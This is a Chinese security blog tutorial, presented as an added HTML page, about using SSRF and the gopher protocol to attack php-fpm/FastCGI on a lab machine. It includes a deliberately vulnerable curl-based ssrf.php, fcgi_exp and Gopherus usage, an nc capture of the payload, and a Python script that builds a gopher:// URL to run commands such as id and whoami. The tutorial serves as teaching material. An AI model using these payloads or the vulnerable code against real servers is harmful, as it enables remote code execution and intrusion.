@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>SSRF系列之攻击FastCGI | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="ssrf,FastCGI,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>SSRF系列之攻击FastCGI</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-09-09
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>本文首发<a href="https://bbs.ichunqiu.com/thread-58455-1-1.html" target="_blank" rel="noopener">i春秋</a>，未经允许禁止转载</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇文章在讲利用SSRF漏洞攻击内网的Redis的时候提到了Gopher协议，说到了这个协议作为SSRF漏洞利用中的万金油，可以用它来攻击内网的FTP、Telnet、Redis、Memcache、FastCGI等应用，那么这篇文章就来介绍一下FastCGI以及利用SSRF结合Gopher协议攻击FastCGI</p>
+<h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p>维基百科的解释：<strong>快速通用网关接口</strong>（<strong>Fast</strong> <strong>C</strong>ommon <strong>G</strong>ateway <strong>I</strong>nterface／<strong>FastCGI</strong>）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使[服务器可以同时处理更多的网页请求。</p>
+<p>只通过这样简单两句话确实难以理解这是一个什么协议，下面是我通过阅读各种资料后对这个协议的理解</p>
+<p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要通过浏览器进行解析，其中的页面是一对一的(一个内容对应一个页面)，而动态网站需要一个额外的编译解析的过程，网页上的数据是从数据库中或者其他地方调用，页面会随着数据的变化而改变，就产生了一定的交互性。</p>
+<h3 id="浏览器访问静态网页过程"><a href="#浏览器访问静态网页过程" class="headerlink" title="浏览器访问静态网页过程"></a>浏览器访问静态网页过程</h3><p>在整个网页的访问过程中，Web容器(例如Apache、Nginx)只担任着内容分发者的身份，当访问静态网站的主页时，Web容器会到网站的相应目录中查找主页文件，然后发送给用户的浏览器。</p>
+<p><img src="/article/9897b513/Apache处理静态网页浏览.jpg" alt="Apache处理静态网页浏览.jpg"></p>
+<h3 id="浏览器访问动态网页过程"><a href="#浏览器访问动态网页过程" class="headerlink" title="浏览器访问动态网页过程"></a>浏览器访问动态网页过程</h3><p>当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，web容器就会去找PHP解析器来进行处理(这里以Apache为例)，它会把这个请求进行简单的处理，然后交给PHP解释器。</p>
+<p><img src="/article/9897b513/Apache处理动态网页浏览.jpg" alt="Apache处理动态网页浏览.jpg"></p>
+<p>当Apache收到用户对 index.php 的请求后，如果使用的是CGI，会启动对应的 CGI 程序，对应在这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p>
+<p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能 。</p>
+<h2 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h2><p>了解了CGI和FastCGI之后，我们来看一下什么是php-fpm，官方对它的解释是<strong>FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</strong> </p>
+<p>也就是说php-fpm是FastCGI的一个具体实现，并且提供了进程管理的功能，在其中的进程中，包含了master和worker进程，这个在后面我们进行环境搭建的时候可以通过命令查看。其中master 进程负责与 Web 服务器进行通信，接收 HTTP 请求，再将请求转发给 worker 进程进行处理，<strong>worker 进程主要负责动态执行 PHP 代码，</strong>处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。</p>
+<h2 id="php-fpm攻击实现原理"><a href="#php-fpm攻击实现原理" class="headerlink" title="php-fpm攻击实现原理"></a>php-fpm攻击实现原理</h2><p>想要分析它的攻击原理需要从FastCGI协议封装数据内容来看，这里仅对攻击原理做简要描述，<a href="https://www.cnblogs.com/itbsl/p/9828776.html" target="_blank" rel="noopener">CGI 和 FastCGI 协议的运行原理</a>这篇文章中详细介绍了FastCGI协议的内容，其攻击原理就是在设置环境变量实际请求中会出现一个<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。</p>
+<p>而在php5.3.9后来的版本中，php增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在php官方允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改php的设置。</p>
+<p>那么当设置php环境变量为:<code>auto_prepend_file = php://input;allow_url_include = On</code>,就会在执行php脚本之前包含<code>auto_prepend_file</code>文件的内容,<code>php://input</code>也就是POST的内容,这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>靶    机:  Ubuntu</p>
+<p>攻击机:   Kali</p>
+</blockquote>
+<p>这里直接在Ubuntu上安装Nginx和php-fpm，首先安装Nginx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure>
+<p>安装php、php-fpm以及一些插件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common python-software-properties </span><br><span class="line">sudo add-apt-repository ppa:ondrej/php          #这里容易卡死,解决方法使用代理</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install php7.2</span><br><span class="line">sudo -y apt-get install php7.2-fpm php7.2-mysql php7.2-curl php7.2-json php7.2-mbstring php7.2-xml  php7.2-intl</span><br></pre></td></tr></table></figure>
+<h3 id="配置php-fpm"><a href="#配置php-fpm" class="headerlink" title="配置php-fpm"></a>配置php-fpm</h3><p>修改配置监听9000端口来处理nginx的请求</p>
+<p>打开<code>/etc/php/7.2/fpm/pool.d/www.conf</code>文件找到如下位置注释第一行添加第二行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;listen = /run/php/php7.2-fpm.sock</span><br><span class="line">listen = 127.0.0.1:9000</span><br></pre></td></tr></table></figure>
+<p>注意这里如果设置监听为0.0.0.0:9000就在产生php-fpm未授权访问漏洞，此时攻击者可以直接与9000端口上的php-fpm进行通信，进而可以实现任意代码执行。</p>
+<p>下面修改权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /run/php/php7.2-fpm.sock</span><br></pre></td></tr></table></figure>
+<p>打开nginx的配置文件 <code>/etc/nginx/sites-available/default</code> 修改相应部分的配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80; #监听80端口，接收http请求</span><br><span class="line">    server_name  www.example.com; #就是网站地址</span><br><span class="line">    root /usr/local/etc/nginx/www/huxintong_admin; # 准备存放代码工程的路径</span><br><span class="line">    #路由到网站根目录www.example.com时候的处理</span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.php; #跳转到www.example.com/index.php</span><br><span class="line">        autoindex on;</span><br><span class="line">    &#125;  </span><br><span class="line">    #当请求网站下php文件的时候，反向代理到php-fpm</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        fastcgi_split_path_info ^(.+\.php)(/.+)$;</span><br><span class="line">        fastcgi_pass 127.0.0.1:9000;#nginx fastcgi进程监听的IP地址和端口</span><br><span class="line">        #fastcgi_pass unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h3><p>配置完成后查看一下php-fpm的安装位置，然后启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whereis php-fpm</span><br><span class="line">/usr/sbin/php-fpm7.2                #这是我的靶机上php-fpm安装的位置</span><br></pre></td></tr></table></figure>
+<p>重新启动Nginx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure>
+<p>然后检查nginx是否正确启动 <code>systemctl status nginx</code></p>
+<p> <img src="/article/9897b513/image-1600246790450.png" alt="image.png"> </p>
+<p>检查php-fpm是否正确启动 <code>ps -elf | grep php-fpm</code></p>
+<p><img src="/article/9897b513/image-1599621120986.png" alt="image.png"></p>
+<p>这里就可以看出上面所说的存在一个master进程和多个worker进程</p>
+<p>下面将<code>/var/www/html/</code>目录下的文件删除，新建一个index.php，内容可以写上<code></code> 用来检查各项是否正常运行，如果页面为空，查看这篇<a href="https://blog.csdn.net/feiniao8651/article/details/52768911" target="_blank" rel="noopener">文章</a>解决</p>
+<p><img src="/article/9897b513/image-1599621120914.png" alt="image.png"></p>
+<p>其中Sever API 处和上图一样说明运行正确，然后在目录下新建ssrf.php 内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    $url = $_GET[&apos;url&apos;];</span><br><span class="line">    $curl = curl_init($url);    </span><br><span class="line">    //第二种初始化curl的方式</span><br><span class="line">    //$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET[&apos;url&apos;]); </span><br><span class="line"> </span><br><span class="line">    /*进行curl配置*/</span><br><span class="line">    curl_setopt($curl, CURLOPT_HEADER, 0); // 不输出HTTP头</span><br><span class="line">    $responseText = curl_exec($curl);</span><br><span class="line">    //var_dump(curl_error($curl) );//如果执行curl过程中出现异常，可打开此开关，以便查看异常内容</span><br><span class="line"> </span><br><span class="line">    echo $responseText;</span><br><span class="line">    curl_close($curl);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>该代码为一个ssrf漏洞的示例代码，可以访问<code>/ssrf.php?url=http://www.baidu.com</code>进行测试，下图为正常的结果</p>
+<p><img src="/article/9897b513/1599122985564-ab641533-3e64-41ec-8694-ff61c6ba78ac.png" alt="image.png"></p>
+<h2 id="ssrf攻击FastCGI演示"><a href="#ssrf攻击FastCGI演示" class="headerlink" title="ssrf攻击FastCGI演示"></a>ssrf攻击FastCGI演示</h2><h3 id="使用fcgi-exp攻击"><a href="#使用fcgi-exp攻击" class="headerlink" title="使用fcgi_exp攻击"></a>使用fcgi_exp攻击</h3><p>这里在已知其使用了php-fpm的情况下，我们可以先使用<a href="https://github.com/piaca/fcgi_exp" target="_blank" rel="noopener">fcgi_exp</a>测试是否可以直接攻击9000端口，这个工具主要是用来攻击未授权访问php-fpm的，所以一些地方需要自己写脚本转换一下payload，下面是使用方法</p>
+<p>该工具需要go语言环境,下载后进入目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build fcgi_exp.go                    #编译fcgi_exp.go</span><br></pre></td></tr></table></figure>
+<p>这里直接运行可以看到fcgi_exp的使用方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Usage:   ./fcgi_exp &lt;cmd&gt; &lt;ip&gt; &lt;port&gt; &lt;file&gt; [command]</span><br><span class="line">         cmd: phpinfo, system, read</span><br><span class="line">              the SYSTEM cmd only affects PHP-FPM &gt;= 5.3.3</span><br><span class="line">         ip: Target ip to exploit with.</span><br><span class="line">         port: Target port running php-fpm.</span><br><span class="line">         file: File to read or execute.</span><br><span class="line">         command: Command to execute by system. Must use with cmd &apos;system&apos;.</span><br><span class="line"></span><br><span class="line">Example: ./fcgi_exp system 127.0.0.1 9000 /var/www/html/index.php &quot;whoami&quot;</span><br><span class="line">         ./fcgi_exp phpinfo 127.0.0.1 9000 /var/www/html/index.php &gt; phpinfo.html</span><br><span class="line">         ./fcgi_exp read 127.0.0.1 9000 /etc/issue</span><br></pre></td></tr></table></figure>
+<p>使用如下命令进行测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fcgi_exp system 192.168.233.138 9000 /var/www/html/index.php &quot;id&quot;</span><br></pre></td></tr></table></figure>
+<p>在这里显然是不行的，因为在配置端口监听的时候，仅允许监听在127.0.0.1，所以说不能攻击成功，但是如果有的服务器在配置的时候将9000端口监听在公网上了，就可以用上面的方法进行测试。如果仅监听在本地，可以通过ssrf来攻击内部的9000端口。</p>
+<p>在攻击机上使用<code>nc -lvvp 1234 &gt; fcg_exp.txt</code>监听1234 端口来接收payload，另外开启一个终端使用下面的命令发送payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fcgi_exp system 127.0.0.1 1234 /var/www/html/index.php &quot;id&quot;</span><br></pre></td></tr></table></figure>
+<p>注意这里攻击的端口是上面监听的端口，目的是将payload发送到这个端口，运行后可以使用Ctrl+C 来结束运行，现在就得到了一个fcg_exp.txt的文件，里面是获得的payload，可以使用<code>xxd fcg_exp.txt</code>查看其内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/1696613/1599124376273-9c706fbe-e6dd-4bdc-bad6-bc9f86ccbf18.png" alt="image.png"></p>
+<p>文件里的内容有部分是不可见字符，这里需要url编码一下，这里写一个Python脚本对文件中的内容进行编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from urllib.parse import quote, unquote, urlencode</span><br><span class="line"></span><br><span class="line">file = open(&apos;fcg_exp.txt&apos;,&apos;r&apos;)</span><br><span class="line">payload = file.read()</span><br><span class="line">print(&quot;gopher://127.0.0.1:9000/_&quot;+quote(payload).replace(&quot;%0A&quot;,&quot;%0D&quot;).replace(&quot;%2F&quot;,&quot;/&quot;))</span><br></pre></td></tr></table></figure>
+<p>之后使用burp抓一个访问ssrf.php的包，将输出的内容放到?url=后面，然后这里需要再进行一次编码，因为这里curl会进行一次解码，gopher会再进行一次解码，这里直接用burp中的工具</p>
+<p><img src="/article/9897b513/image.png" alt="image.png"></p>
+<p>编码之后直接Go就可以执行刚才设置的命令了</p>
+<p><img src="/article/9897b513/image-1599621121167.png" alt="image.png"></p>
+<h3 id="使用Gopherus攻击"><a href="#使用Gopherus攻击" class="headerlink" title="使用Gopherus攻击"></a>使用Gopherus攻击</h3><p>这个工具相比上一个更加方便一下，该工具能生成Gopher有效负载，用来利用ssrf获得RCE，下面利用这个工具来执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php                 #这里输入的是一个已知存在的php文件</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/article/9897b513/image.png" alt="image.png"></p>
+<p>获得payload，之后用同样的方法在burp Go一下(记得二次编码)</p>
+<p><img src="/article/9897b513/image.png" alt="image.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的演示，可以看到又一个ssrf结合其他漏洞形成重大影响的示例，其实总的来看整个攻击的过程并不复杂，但是这仅仅是通过文章呈现出来的一种错觉，其实在复现的过程中，还是会出现各种各样的问题的，比如说搭建整个环境，其实是尝试了很多种搭建方式之后才成功的，本来也想用一个镜像来复现，但是没有合适的，最后终于找到了一种简单的方法来安装nginx和php-fpm，再比如使用fcgi_exp攻击时写的脚本，其实是修改了很多次才成功的。所以说大家如果想真正理解和掌握这个漏洞，最好还是自己搭建环境尝试一下，通过搭建环境，学到的不仅仅是这个漏洞，还有这些环境的一些知识。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<p><a href="https://blog.csdn.net/feiniao8651/article/details/52768911" target="_blank" rel="noopener">https://blog.csdn.net/feiniao8651/article/details/52768911</a></p>
+<p><a href="https://xz.aliyun.com/t/6993" target="_blank" rel="noopener">https://xz.aliyun.com/t/6993</a></p>
+<p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习/" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/9897b513.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/ssrf/">
+              #ssrf
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/FastCGI/">
+              #FastCGI
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/9d7d2c7d.html" target="_self">SSRF攻击内网Redis</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/5d927c8d.html" target="_self">页面图片验证码测试思路</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
